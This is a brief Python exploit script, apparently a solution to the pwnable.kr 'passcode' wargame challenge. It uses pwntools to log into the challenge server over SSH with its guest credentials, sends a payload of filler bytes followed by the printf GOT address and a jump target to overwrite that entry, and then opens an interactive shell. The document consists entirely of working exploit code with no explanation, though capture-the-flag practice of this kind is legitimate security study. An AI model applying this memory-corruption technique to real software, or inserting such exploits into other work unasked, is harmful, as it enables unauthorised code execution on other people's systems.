from pwn  import *

target=ssh(user='passcode',host='pwnable.kr',port=2222,password='guest')

printf_Got=0x0804a000

payload='a'*0x60+p32(printf_Got)+str(134514135)

r=target.process(executable='./passcode')

r.send(payload)

r.interactive()
